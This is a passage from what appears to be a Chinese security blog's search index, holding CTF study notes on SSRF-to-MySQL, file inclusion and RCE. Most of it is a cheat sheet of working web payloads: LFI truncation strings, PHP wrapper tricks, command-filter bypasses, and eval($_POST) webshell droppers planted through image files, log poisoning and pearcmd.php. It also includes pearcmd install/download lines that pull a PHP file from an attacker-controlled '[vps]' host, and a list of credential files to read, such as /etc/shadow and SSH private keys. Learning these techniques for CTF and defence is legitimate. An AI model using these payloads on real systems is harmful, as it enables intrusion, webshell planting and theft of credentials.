id="ssrf打mysql">ssrf打mysql</h3><p>参考</p><p>https://www.sqlsec.com/2021/12/bytectf2021.html</p><p>https://blog.foxsuzuran.top/2023/07/14/%e8%ae%b0%e4%b8%80%e6%ac%a1%e6%94%bb%e5%87%bbssrf%e9%9d%b6%e5%9c%babytectf2021-final-seo%e7%9a%84%e7%bb%8f%e8%bf%87/</p><p>ssrf dict探测到有3306。利用<ahref="https://github.com/tarunkant/Gopherus">Gopherus</a>生成payload探测mysql有无密码</p><p>注意Gopherus无法直接生成udf的payload（会截断），需要改一下代码</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>ssrf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件包含与RCE</title>
    <link href="/2023/01/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8ERCE/"/>
    <url>/2023/01/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8ERCE/</url>
    
    <content type="html"><![CDATA[<h1 id="文件包含与rce">文件包含与RCE</h1><h2 id="文件包含">文件包含</h2><h3 id="文件包含常见函数">文件包含常见函数</h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">PHP：<span class="hljs-built_in">include</span>()，<span class="hljs-built_in">include_once</span>()，<span class="hljs-built_in">require</span>()，<span class="hljs-built_in">require_once</span>()，<span class="hljs-built_in">fopen</span>()，<span class="hljs-built_in">readfile</span>() 等<br>JSP Servlet：ava<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.File</span>()，java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.FileReader</span>() 等<br>ASP：includefile，includevirtual 等<br></code></pre></td></tr></table></figure><p>当 PHP 包含一个文件时，会将该文件当做 PHP代码执行，而不会在意文件是什么类型。</p><h3 id="本地文件包含lfi">本地文件包含(LFI)</h3><h4 id="截断">[1]%00 截断</h4><p>需要 <code>magic_quotes_gpc=off</code>，PHP 小于 5.3.4 有效。<code>?file=../../../../../../../../../etc/passwd%00</code></p><h4 id="路径长度截断">[2]路径长度截断</h4><p>Linux 需要文件名长于 4096，Windows 需要长于 256。<code>?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.</code></p><h4 id="点号截断">[3]点号截断</h4><p>只适用 Windows，点号需要长于 256。<code>?file=../../../../../../../../../boot.ini/………[…]…………</code></p><h3 id="远程文件包含rfi">远程文件包含(RFI)</h3><p>条件 <code>allow_url_include = on</code></p><p>实质上和LFI一样，只是能够包含远程的文件</p><p>用得比较多的协议有<code>php://input</code></p><h3 id="伪协议">伪协议</h3><h4 id="phpinput">php://input</h4><p>利用条件： <code>allow_url_include=On</code><code>allow_url_fopen=Off/On</code></p><p>php://input是个可以访问请求的原始数据的只读流，可以接收post请求作为输入流的输入，将请求作为PHP代码输入，以达到以post的形式进行输入的目的就可以执行命令命令遇到<code>file_get_contents()</code>要联想到<code>php://input</code>绕过</p><h4 id="phpfilter">php://filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file1</span>);        <span class="hljs-comment">#文件读取</span><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file2</span>,<span class="hljs-variable">$txt</span>);   <span class="hljs-comment">#文件写入</span><br><span class="hljs-meta">?&gt;</span><br><br>payload:<br><br>?file1=php:<span class="hljs-comment">//filter/resource=flag.php                             #明文读取</span><br>?file1=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=flag.php  #编码读取</span><br> <br>?file2=php:<span class="hljs-comment">//filter/resource=test.txt&amp;txt=test                             #明文写入</span><br>?file2=php:<span class="hljs-comment">//filter/write=convert.base64-encode/resource=test.txt&amp;txt=test #编码写入</span><br></code></pre></td></tr></table></figure><p>利用条件： <code>allow_url_include=On</code><code>allow_url_fopen=Off/On</code></p><p>常见编码有两种方式：<code>base64</code>/rot-13编码，两种过滤器分别为：<code>base64：convert.base64-encode</code><code>rot-13：string.rot13</code> 扩展（绕过方式）：https://blog.csdn.net/woshilnp/article/details/117266628https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT</p><h4 id="data">data://</h4><p>利用条件： <code>allow_url_include=On</code><code>allow_url_fopen=On</code></p><p>类似php://input，用户控制输入流<code>data://text/plain;base64,Y2F0IC9mbGFn</code><code>data:text/plain;base64,Y2F0IC9mbGFn</code></p><h4 id="zip">zip://</h4><p>利用条件： <code>allow_url_include=On</code><code>allow_url_fopen=Off/On</code></p><p>zip://可以访问压缩包里面的文件，当它与包含函数结合时，zip://流会被当作php文件执行，从而实现任意代码执⾏。只需要是zip的压缩即可，后缀名可以任意更改<code>zip:///tmp/file.zip%23flag.txt</code></p><h4 id="phar">phar://</h4><p>利用条件： <code>allow_url_include=On</code><code>allow_url_fopen=Off/On</code></p><p>php解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压，与zip协议有些相似</p><h4 id="netdoc">netdoc://</h4><p>在java中可以利用netdoc协议读取文件，可以简单认为部分代替了file协议，多用于ssrf</p><h2 id="rce">RCE</h2><p>RCE英文全称：remote command/code execute（远程命令/代码执行漏洞）漏洞出现的原因：没有在输入口做输入处理。我们常见的路由器、防火墙、入侵检测等设备的web管理界面上可能会提供给用户一个命令操作的web界面/接口，如果此接口未做过滤/有漏洞，攻击者有可能直接向服务器远程注入操作系统命令或者代码，从而控制后台系统，这就是RCE漏洞。</p><h3 id="危险函数">危险函数：</h3><p>php：<code>eval()</code>、<code>assert()</code>、<code>create_function()</code>、<code>call_user_func()</code>、<code>call_user_func_array()</code>、<code>exec()</code>asp：<code>eval()</code>perl：<code>exec</code>、<code>system</code>、<code>qx//</code>python：<code>os.system()</code> go：<code>exec.Command()</code></p><h3 id="绕过方式">绕过方式</h3><h4 id="过滤cat">过滤cat</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs Bash">more:        一页一页的显示档案内容<br>less:        与 more 类似 <span class="hljs-built_in">head</span>:查看头几行<br><span class="hljs-built_in">tac</span>:        从最后一行开始显示，可以看出 <span class="hljs-built_in">tac</span> 是<span class="hljs-built_in">cat</span> 的反向显示<br><span class="hljs-built_in">tail</span>:        查看尾几行<br><span class="hljs-built_in">nl</span>:                显示内容，顺便输出行号<br><span class="hljs-built_in">od</span>:                以二进制的方式读取档案内容<br>vi:                一种编辑器，这个也可以查看<br>vim:        一种编辑器，这个也可以查看<br><span class="hljs-built_in">sort</span>:        文件排序并输出也可以查看内容<br><span class="hljs-built_in">uniq</span>:        可以查看 file -f:报错出具体内容 grep<br>strings: 在对象文件或二进制文件中查找可打印的字符串, 在当前目录中，查找后缀有 file 字样的文件中包含 <span class="hljs-built_in">test</span> 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep <span class="hljs-built_in">test</span> *file strings<br><span class="hljs-built_in">paste</span>        把每个文件以列对列的方式，一列列地加以合并<br>grep        grep &#123; flag.php打印有”&#123;“的一行<br>sed                一种编辑器，可以用sed -f flag.php读取flag<br>rev          读取倒叙的文件内容<br></code></pre></td></tr></table></figure><h4 id="过滤空格">过滤空格</h4><p>使用<code>/**/</code>、<code>&lt;</code>、<code>&lt;&gt;</code>、<code>%20</code>、<code>%09</code>、<code>$IFS$9</code>、<code>$&#123;IFS&#125;</code>、<code>IFS</code>、<code>$IFS$1</code>等</p><h4 id="过滤分隔符">过滤分隔符 /</h4><p>利用<code>;</code>执行多条命令</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">cd</span> xx;<span class="hljs-built_in">ls</span> -al</span><br></code></pre></td></tr></table></figure><h4 id="过滤运算符和">过滤运算符|和&amp;</h4><p>使用<code>;</code>或 <code>%0a</code></p><h4 id="过滤flagphp等字符">过滤flag、php等字符</h4><h5 id="拼接字符串绕过">拼接字符串绕过</h5><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?cmd=m=p%0an=hp%0acat$&#123;IFS&#125;flag.$m$n<br></code></pre></td></tr></table></figure><h5 id="ls--i">ls -i</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -i + <span class="hljs-built_in">cat</span> `find / -inum <span class="hljs-built_in">id</span>`<br></code></pre></td></tr></table></figure><p>组合拳</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Bash"><span class="hljs-built_in">ls</span> -i   <span class="hljs-comment">#找出文件pid</span><br><span class="hljs-built_in">cat</span> `find / -inum <span class="hljs-built_in">id</span>`   <span class="hljs-comment">#find / -inum id返回此id对应的文件名（路径）</span><br></code></pre></td></tr></table></figure><h5 id="输出到另一个文件">输出到另一个文件</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Bash"><span class="hljs-built_in">printf</span> /fla &gt; /tmp/hello %26%26 <span class="hljs-built_in">printf</span> g &gt;&gt; /tmp/hello %26%26 <span class="hljs-built_in">cat</span> `<span class="hljs-built_in">cat</span> /tmp/hello`<br><span class="hljs-comment">#printf /fla &gt; /tmp/hello ----&gt; 将 /fla 写入/tmp/hello文件</span><br><span class="hljs-comment">#printf g &gt;&gt; /tmp/hello ----&gt; 将 g 追加写入/tmp/hello文件。目前/tmp/hello文件中的内容就是：/flag</span><br><span class="hljs-built_in">cat</span> `<span class="hljs-built_in">cat</span> /tmp/hello` ----&gt; `<span class="hljs-built_in">cat</span> /tmp/hello` 会输入出 /flag，<span class="hljs-built_in">cat</span> 会读取 /flag ，即可得到flag。<br></code></pre></td></tr></table></figure><h5 id="编码绕过写入文件">编码绕过(写入文件)</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==&quot;</span> | <span class="hljs-built_in">base64</span> -d 1.php<br></code></pre></td></tr></table></figure><h5 id="单双引号绕过">单双引号绕过</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ca<span class="hljs-string">&#x27;&#x27;</span>t fl<span class="hljs-string">&#x27;&#x27;</span>ag 或ca<span class="hljs-string">&quot;&quot;</span>t fl<span class="hljs-string">&quot;&quot;</span>ag<br></code></pre></td></tr></table></figure><h5 id="shell变量绕过">shell变量绕过</h5><p><code>ca$@t fla$@g</code>或者<code>ca$1t fla$2g</code></p><h5 id="反斜杠绕过">反斜杠绕过</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ca\t f\lag<br></code></pre></td></tr></table></figure><h5 id="通配符绕过">通配符绕过</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> f*<br><span class="hljs-built_in">cat</span> fla?<br></code></pre></td></tr></table></figure><h4 id="其他">其他</h4><h5 id="花括号">花括号</h5><p>在Linux bash中还可以使用{OS_COMMAND,ARGUMENT}来执行系统命令<code>&#123;cat,flag&#125;</code></p><h5 id="反引号">反引号</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> `<span class="hljs-built_in">ls</span>`<br></code></pre></td></tr></table></figure><p>相当于cat目录下所有文件</p><h5 id="非法变量">非法变量</h5><p>https://blog.csdn.net/mochu7777777/article/details/115050295</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-variable">$var</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;a_b.&#x27;</span>];<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$var</span>);<br></code></pre></td></tr></table></figure><p>当<code>PHP版本小于8</code>时，如果参数中出现中括号<code>[</code>，中括号会被转换成下划线<code>_</code>，但是会出现转换错误导致接下来如果该参数名中还有<code>非法字符</code>并不会继续转换成下划线<code>_</code>，也就是说如果中括号<code>[</code>出现在前面，那么中括号<code>[</code>还是会被转换成下划线<code>_</code>，但是因为出错导致接下来的非法字符并不会被转换成下划线<code>_</code></p><p>传参 <code>?a[b.=system("ls");</code></p><h5 id="一些组合拳payload">一些组合拳payload</h5><figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs smalltalk">tac&lt;/fla\g.php||<br>awk%<span class="hljs-number">09</span><span class="hljs-string">&#x27;/f/&#123;print&#125;&#x27;</span>%<span class="hljs-number">09</span>/fla?||<br>uniq<span class="hljs-string">$&#123;</span><span class="hljs-type">IFS</span>&#125;/f???<br>/???/????<span class="hljs-number">64</span> /????<br>uniq `expr substr <span class="hljs-string">$P</span>ATH <span class="hljs-number">11</span>`f*<br>od -c <span class="hljs-string">$&#123;</span><span class="hljs-type">OLDPWD</span>&#125;flag<br>cat <span class="hljs-string">$&#123;</span><span class="hljs-type">PATH</span>:<span class="hljs-number">0</span>:<span class="hljs-number">1</span>&#125;f*<br><span class="hljs-string">$&#123;</span><span class="hljs-type">PATH</span>:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#HOME</span>&#125;:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125;<span class="hljs-string">$&#123;</span><span class="hljs-type">PATH</span>:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#LESS</span>&#125;:<span class="hljs-string">$&#123;</span><span class="hljs-type">SHLVL</span>&#125;&#125;   <span class="hljs-symbol">#ls</span><br><span class="hljs-string">$&#123;</span><span class="hljs-type">PATH</span>:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#HOME</span>&#125;:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125;<span class="hljs-string">$&#123;</span><span class="hljs-type">PATH</span>:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#RANDOM</span>&#125;:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125; ?<span class="hljs-string">$&#123;</span><span class="hljs-type">PATH</span>:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#RANDOM</span>&#125;:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125;??   #应该是这个：nl flag<br><span class="hljs-string">$&#123;</span><span class="hljs-type">PWD</span>::<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125;???<span class="hljs-string">$&#123;</span><span class="hljs-type">PWD</span>::<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125;?<span class="hljs-string">$&#123;</span><span class="hljs-type">USER</span>:~<span class="hljs-type">A</span>&#125;? ????   #/bin/cat flag<br>&lt;<span class="hljs-type">A</span>;<span class="hljs-string">$&#123;</span><span class="hljs-type">HOME</span>::<span class="hljs-string">$?</span>&#125;???<span class="hljs-string">$&#123;</span><span class="hljs-type">HOME</span>::<span class="hljs-string">$?</span>&#125;?????<span class="hljs-string">$&#123;</span><span class="hljs-type">RANDOM</span>::<span class="hljs-string">$?</span>&#125; ????      #/bin/base64 flag<br></code></pre></td></tr></table></figure><h3 id="无参数无数字字母rce">无参数/无数字字母RCE</h3><p>参考https://xz.aliyun.com/t/8107#toc-0、https://xz.aliyun.com/t/9360</p><p>过滤system<code>popen()</code>、<code>passthru()</code>、<code>proc_open()</code>、<code>pcntl_exec()</code>、<code>shell_exec()</code></p><h4 id="一些常用函数">(1)一些常用函数</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print_r</span><span class="hljs-params">()</span></span> 打印字符串（可以用连接符）、数组、对象。<br><span class="hljs-function"><span class="hljs-title">scandir</span><span class="hljs-params">()</span></span> 扫描目录下的文件<br><span class="hljs-function"><span class="hljs-title">current</span><span class="hljs-params">()</span></span> 返回数组中的当前单元, 默认取第一个值。<br><span class="hljs-function"><span class="hljs-title">localeconv</span><span class="hljs-params">()</span></span> 返回一包含本地数字及货币格式信息的数组<br><span class="hljs-function"><span class="hljs-title">pos</span><span class="hljs-params">()</span></span> 与current差不多<br>可以执行<span class="hljs-selector-tag">a</span>(<span class="hljs-selector-tag">b</span>(<span class="hljs-built_in">c</span>()))形式时，<span class="hljs-built_in">print_r</span>(<span class="hljs-built_in">scandir</span>(<span class="hljs-built_in">current</span>(<span class="hljs-built_in">localeconv</span>()))) 读当前目录文件<br></code></pre></td></tr></table></figure><h4 id="读取文件函数">(2)读取文件函数</h4><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">file_get_contents</span>() 把整个文件读入一个字符串中<br><span class="hljs-built_in">file</span>() 把整个文件读入一个数组中;<br><span class="hljs-built_in">readfile</span>() 读入一个文件并写入到输出缓冲;<br><span class="hljs-built_in">highlight_file</span>() 对文件进行语法高亮显示;<br><span class="hljs-built_in">show_source</span>() 对文件进行语法高亮显示;<br><span class="hljs-built_in">array_flip</span>() 将读取当前目录的键和值进行反转<br><span class="hljs-built_in">array_rand</span>() 随机输出键<br></code></pre></td></tr></table></figure><h2 id="lfi_to_rce">LFI_to_RCE</h2><p>example：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="图片马getshell">图片马getshell</h3><p>条件： <code>allow_url_include=on</code><code>allow_url_fopen=on</code></p><p>图片马内容，会在当前目录下生成shell.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;shell.php&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>),<span class="hljs-string">&#x27;&lt;? @eval($_POST[1]);?&gt;&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3id="临时文件phpinfo条件竞争getshell">临时文件+phpinfo条件竞争getshell、</h3><p>基本没遇到过，写个思路以及别人的方法，遇到了再深入</p><p><ahref="https://blog.csdn.net/qq_43576303/article/details/119105376">思路</a>：实质上是连续传输很大的字节到服务器导致删除文件有时间差，包含临时的/tmp/6字节长度文件名php</p><p><ahref="https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md">脚本</a>：python2的脚本</p><h3 id="日志getshell">日志getshell</h3><h4 id="apache日志文件">apache日志文件</h4><p>条件： apache日志文件路径已知，或配置文件路径已知，有可读权限</p><p>先看<code>/etc/init.d/httpd</code>或<code>/etc/httpd/conf/httpd.conf</code>找到log文件路径</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">/<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;/var/www/html/shell.php&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>),<span class="hljs-string">&#x27;&lt;? @eval($_POST[1]);?&gt;&#x27;</span>);<span class="hljs-meta">?&gt;</span><br><br>payload：<br>?file=/usr/local/apache/logs/error_log<br>?file=/usr/local/apache/logs/access_log<br><br>?file=shell.php<br></code></pre></td></tr></table></figure><h4 id="ssh日志文件">ssh日志文件</h4><p>条件 SSH日志路径已知，有可读权限</p><p>将ssh用户名写为php马，ssh自动写入<code>/var/log/auth.log</code></p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">ssh &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;@192.168.136.143</span><br><span class="language-xml"></span><br><span class="language-xml">payload：</span><br><span class="language-xml">?file=/var/log/auth.log</span><br></code></pre></td></tr></table></figure><h3 id="session文件包含getshell">Session文件包含getshell</h3><p>条件： <code>php&gt;=5.4</code><code>session.upload_progress.enable = on</code>已知<code>session.save_path</code></p><p>分为两种</p><ol type="1"><li>session.upload_progress.cleanup = on</li></ol><p>文件会清空，需要条件竞争</p><ol type="1"><li>session.upload_progress.cleanup = off</li></ol><p>文件不会清空，直接包含<code>session.save_path+session.upload_progress.prefix+session_id</code>文件</p><h3 id="pearcmd.php文件包含getshell">pearcmd.php文件包含getshell</h3><p>条件 安装了pear扩展已知<code>pearcmd.php</code>路径(默认路径是<code>/usr/local/lib/php/pearcmd.php</code>)<code>register_argc_argv=on</code>（只有开启了，<code>$_SERVER['argv']</code>才会生效。）</p><p>三种方法</p><p>config-create</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);?&gt;+/tmp/test.php<br></code></pre></td></tr></table></figure><p>install</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">?<span class="hljs-code">+install+</span>--installroot<span class="hljs-code">+&amp;file=/usr/local/lib/php/pearcmd.php&amp;+</span><span class="hljs-link">http://</span>[<span class="hljs-string">vps</span>]:[port]/test.php<br></code></pre></td></tr></table></figure><p>download</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">?<span class="hljs-code">+download+</span><span class="hljs-link">http://</span>[<span class="hljs-string">vps</span>]:[port]/test1.php&amp;file=/usr/local/lib/php/pearcmd.php<br></code></pre></td></tr></table></figure><p>具体参考：<ahref="https://xilitter.github.io/2023/01/31/利用pearcmd-php文件包含拿shell（LFI）/index.html">pearcmd文件包含getshell</a></p><h2 id="文件读取利用">文件读取利用</h2><h3 id="常见读取的敏感文件路径">常见读取的敏感文件路径</h3><p>参考https://www.buaq.net/go-161450.html</p><h4 id="windows">windows</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Plain">C:\boot.ini //查看系统版本<br>C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件<br>C:\Windows\repair\sam //存储系统初次安装的密码<br>C:\Program Files\mysql\my.ini //Mysql配置<br>C:\Program Files\mysql\data\mysql\user.MYD //Mysql root<br>C:\Windows\php.ini //php配置信息<br>C:\Windows\my.ini //Mysql配置信息<br></code></pre></td></tr></table></figure><h4 id="linux">Linux</h4><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-regexp">/root/</span>.ssh<span class="hljs-regexp">/authorized_keys /</span><span class="hljs-operator">/</span>如需登录到远程主机，需要到.ssh目录下，新建authorized_keys文件，并将id_rsa.pub内容复制进去<br><span class="hljs-regexp">/root/</span>.ssh<span class="hljs-regexp">/id_rsa /</span><span class="hljs-operator">/</span>ssh私钥,ssh公钥是id_rsa.pub<br><span class="hljs-regexp">/root/</span>.ssh<span class="hljs-regexp">/id_ras.keystore /</span><span class="hljs-operator">/</span>记录每个访问计算机用户的公钥<br><span class="hljs-regexp">/root/</span>.ssh<span class="hljs-regexp">/known_hosts  /</span><span class="hljs-regexp">/ssh会把每个访问过计算机的公钥(public key)都记录在~/</span>.ssh<span class="hljs-operator">/</span>known_hosts<span class="hljs-operator">。</span>当下次访问相同计算机时，<span class="hljs-type">OpenSSH会核对公钥</span><span class="hljs-operator">。</span>如果公钥不同，<span class="hljs-type">OpenSSH会发出警告，</span> 避免你受到<span class="hljs-type">DNS</span> <span class="hljs-type">Hijack之类的攻击</span><span class="hljs-operator">。</span><br><span class="hljs-regexp">/etc/</span>passwd <span class="hljs-comment">// 账户信息</span><br><span class="hljs-regexp">/etc/</span>shadow <span class="hljs-comment">// 账户密码文件</span><br><span class="hljs-regexp">/etc/</span>my.cnf <span class="hljs-comment">//mysql 配置文件</span><br><span class="hljs-regexp">/etc/</span>httpd<span class="hljs-regexp">/conf/</span>httpd.conf <span class="hljs-comment">// Apache配置文件</span><br><span class="hljs-regexp">/etc/</span>redhat<span class="hljs-operator">-</span>release 系统版本 <br><span class="hljs-regexp">/root/</span>.bash_history <span class="hljs-comment">//用户历史命令记录文件</span><br><span class="hljs-regexp">/root/</span>.mysql_history <span class="hljs-comment">//mysql历史命令记录文件</span><br><span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/mlocate/</span>mlocate.db <span class="hljs-comment">//全文件路径</span><br><span class="hljs-regexp">/proc/</span><span class="hljs-keyword">self</span><span class="hljs-regexp">/fd/</span>fd[<span class="hljs-number">0</span><span class="hljs-operator">-</span><span class="hljs-number">9</span>]<span class="hljs-operator">*</span>(文件标识符)<br><span class="hljs-regexp">/proc/</span>mounts <span class="hljs-comment">//记录系统挂载设备</span><br><span class="hljs-regexp">/porc/</span>config.gz <span class="hljs-comment">//内核配置文件</span><br><span class="hljs-regexp">/porc/</span><span class="hljs-keyword">self</span><span class="hljs-regexp">/cmdline /</span><span class="hljs-operator">/</span>当前进程的cmdline参数<br><span class="hljs-regexp">/proc/</span>sched_debug 配置文件可以看到当前运行的进程并可以获得对应进程的pid<br><span class="hljs-regexp">/proc/</span>pid<span class="hljs-operator">/</span>cmdline   则可以看到对应pid进程的完整命令行<span class="hljs-operator">。</span><br><span class="hljs-regexp">/proc/</span>net<span class="hljs-operator">/</span>fib_trie   内网<span class="hljs-type">IP</span><br><span class="hljs-regexp">/proc/</span><span class="hljs-keyword">self</span><span class="hljs-operator">/</span>environ   环境变量<br><span class="hljs-regexp">/proc/</span><span class="hljs-keyword">self</span><span class="hljs-operator">/</span>loginuid   当前用户<br></code></pre></td></tr></table></figure><h3 id="绕过思路">绕过思路</h3><p>可以进行fuzz</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs llvm">url编码代替.或者/，如使用<span class="hljs-variable">%2</span>F代替/<br>?filename<span class="hljs-operator">=</span>..<span class="hljs-variable">%2</span>F..<span class="hljs-variable">%2</span>F..<span 